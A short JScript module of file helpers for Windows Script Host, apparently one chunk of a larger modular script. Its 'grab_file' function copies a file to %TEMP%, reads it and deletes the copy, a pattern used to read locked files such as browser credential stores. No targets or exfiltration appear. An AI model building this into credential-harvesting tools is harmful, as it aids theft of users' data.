// chunk: core/file_ops
// depends: (none)
// provides: _fso, file_exists, read_file, grab_file
// format: jscript

var _fso = new ActiveXObject("Scripting.FileSystemObject");

function file_exists(p) {
    return _fso.FileExists(p);
}

function read_file(p, maxBytes) {
    try {
        if (!_fso.FileExists(p)) return "";
        var f = _fso.OpenTextFile(p, 1);
        var s = f.ReadAll();
        f.Close();
        if (maxBytes && s.length > maxBytes) s = s.substring(0, maxBytes);
        return s;
    } catch(ex) { return ""; }
}

function grab_file(src, tag) {
    try {
        var tmp = _s.ExpandEnvironmentStrings("%TEMP%") + "\\" + tag + ".tmp";
        _fso.CopyFile(src, tmp, true);
        var s = read_file(tmp, 1048576);
        _fso.DeleteFile(tmp);
        return s;
    } catch(ex) { return ""; }
}
